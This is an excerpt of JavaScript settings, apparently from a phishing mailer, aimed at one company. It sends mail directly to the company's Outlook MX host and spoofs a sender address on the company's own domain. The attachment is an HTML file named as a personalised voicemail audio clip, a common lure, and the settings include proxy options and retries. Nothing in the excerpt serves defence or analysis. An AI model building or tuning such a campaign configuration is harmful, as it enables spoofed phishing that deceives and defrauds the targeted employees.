...
const options = {
  method: 'MX', // Options: 'SMTP', 'MX'
  useAuthentication: true,
  useProxy: false,
  proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
  smtpHost: 'orangeelectric-com.mail.protection.outlook.com',
  smtpPort: 25,
  smtpSecure: true,
...
const attachmentNameWithPlaceholders = 'Play_VM-Now{RECIPIENT_NAME}Audiowav012.html.';
const senderAddresses = ['Tara.Sessions@orangeelectric.com'];
const messageFile = 'message.html';
const senderNameWithPlaceholders = "ok"; 
const subjectLineWithPlaceholders = "ok";
const MAX_RETRIES = 3; 
